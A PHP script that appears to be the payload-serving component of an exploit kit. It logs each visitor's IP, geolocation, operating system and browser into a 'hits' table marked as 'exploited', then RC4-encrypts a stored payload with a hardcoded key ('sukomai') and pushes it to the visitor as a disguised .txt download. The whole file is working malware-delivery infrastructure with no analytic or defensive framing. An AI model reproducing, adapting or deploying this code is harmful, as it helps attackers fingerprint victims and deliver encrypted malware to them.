<?php
require_once('index/inc/config.php');

$d = apache_request_headers();

class RC4
{
    public function Encrypt($a, $b)
    {
        for ($i, $c; $i < 256; $i++)
            $c[$i] = $i;
        for ($i = 0, $d, $e, $g = strlen($a); $i < 256; $i++) {
            $d     = ($d + $c[$i] + ord($a[$i % $g])) % 256;
            $e     = $c[$i];
            $c[$i] = $c[$d];
            $c[$d] = $e;
        }
        for ($y, $i, $d = 0, $f; $y < strlen($b); $y++) {
            $i     = ($i + 1) % 256;
            $d     = ($d + $c[$i]) % 256;
            $e     = $c[$i];
            $c[$i] = $c[$d];
            $c[$d] = $e;
            $f .= chr(ord($b[$y]) ^ $c[($c[$i] + $c[$d]) % 256]);
        }
        return $f;
    }
    public function Decrypt($a, $b)
    {
        return RC4::Encrypt($a, $b);
    }
}

if (!isset($_GET['id']))
    die();


$stmt = $dbh->prepare('SELECT * FROM flows WHERE id = ?');
$stmt->execute(array(
    $_GET['id']
));
$data = $stmt->fetch();

$id = $data['file_id'];


if (!empty($id)) {
    $stmt = $dbh->prepare('SELECT file FROM files WHERE id = ?');
    $stmt->execute(array(
        $id
    ));
    $file = $stmt->fetch();

    $geo = json_decode(file_get_contents("http://localhost:8080/json/" . $d['X-Forwarded-For']), true);


    $os    = 'nc';
    $tryos = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11'
    );

    foreach ($tryos as $re => $lab) {
        if (preg_match($re, $_SERVER['HTTP_USER_AGENT']))
            $os = $lab;
    }

    $country = $geo['country_code'];
    $city    = $geo['city'];

    if (empty($city)) {
        $city = 'Unknown';
    }

    // Parse user agent string in browser definition
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'rv:11.0'))
        $browser = $config['misc']['browsers']['IE11'];
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 10.'))
        $browser = $config['misc']['browsers']['IE10'];
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 9.'))
        $browser = $config['misc']['browsers']['IE9'];
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 8.'))
        $browser = $config['misc']['browsers']['IE8'];
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 7.'))
        $browser = $config['misc']['browsers']['IE7'];
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 6.'))
        $browser = $config['misc']['browsers']['IE6'];
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 5.'))
        $browser = $config['misc']['browsers']['IE5'];
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'Firefox'))
        $browser = $config['misc']['browsers']['Firefox'];
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome'))
        $browser = $config['misc']['browsers']['Chrome'];
    if(preg_match('/Edge/i',$_SERVER['HTTP_USER_AGENT']))
    {
        $browser = "Edge";
    }

    if (empty($_SERVER['HTTP_REFERER']))
        $_SERVER['HTTP_REFERER'] = 'Direct hit';

    $stmt = $dbh->prepare("INSERT INTO hits (owner, flow, ip, agent, referrer, country, city, browser, exploited, timestamp, os) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
    $stmt->execute(array(
        $data['user_id'],
        $_GET['id'],
        $d['X-Forwarded-For'],
        htmlentities($_SERVER['HTTP_USER_AGENT']),
        htmlentities($_SERVER['HTTP_REFERER']),
        $country,
        $city,
        $browser,
        1,
        time(),
        $os
    ));

    $key            = "sukomai";
    $encrypted      = RC4::Encrypt($key, $file['file']);
    $file_random    = $_GET['id'] . ".txt";
    $temp_file_name = "index/tmp/" . $file_random;
    $tmp_write      = fopen('index/tmp/' . $file_random, 'w');
    fwrite($tmp_write, $encrypted);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($temp_file_name) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($temp_file_name));
    readfile($temp_file_name);
    exit;
} else {
    die();
}


?>
